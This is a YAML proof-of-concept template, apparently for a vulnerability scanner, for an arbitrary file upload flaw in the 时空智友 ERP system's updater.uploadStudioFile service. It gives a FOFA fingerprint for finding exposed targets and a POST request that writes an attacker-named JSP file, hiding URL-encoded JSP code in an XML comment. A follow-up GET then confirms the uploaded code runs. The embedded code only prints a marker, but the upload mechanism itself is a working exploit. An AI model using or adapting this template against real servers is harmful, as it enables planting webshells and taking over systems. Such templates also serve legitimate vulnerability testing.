id: poc-yaml-skzy-erp-updater-uploadstudiofile-anyfile-upload
info:
  name: 时空智友ERP系统 updater.uploadStudioFile 任意文件上传漏洞
  severity: critical
  tags:
  - 文件上传
  finger: 时空智友ERP
  fofa: body="login.jsp?login=null"
variables:
  t1: random_str(4)
  t2: md5(9999)
requests:
- method: POST
  path: /formservice?service=updater.uploadStudioFile
  headers:
    Content-Type: application/x-www-form-urlencoded
  data: content=<?xml%20version="1.0"?><root><filename>{{.t1}}.jsp</filename><filepath>./</filepath><filesize>172</filesize><lmtime>1970-01-01%2008:00:00</lmtime></root><!--%3c%25%20%6f%75%74%2e%70%72%69%6e%74%6c%6e%28%22%66%61%32%34%36%64%30%32%36%32%63%33%39%32%35%36%31%37%62%30%63%37%32%62%62%32%30%65%65%62%31%64%22%29%20%3b%25%3e-->
  expression: status_code == 200 && contains(body,"文件大小错误")
- method: GET
  path: /update/temp/studio/{{.t1}}.jsp
  expression: status_code == 200 && contains(body,"<filename>") && contains(body,"<root>")
    && contains(body,t1) && contains(body,`!--`+t2)
transport: http
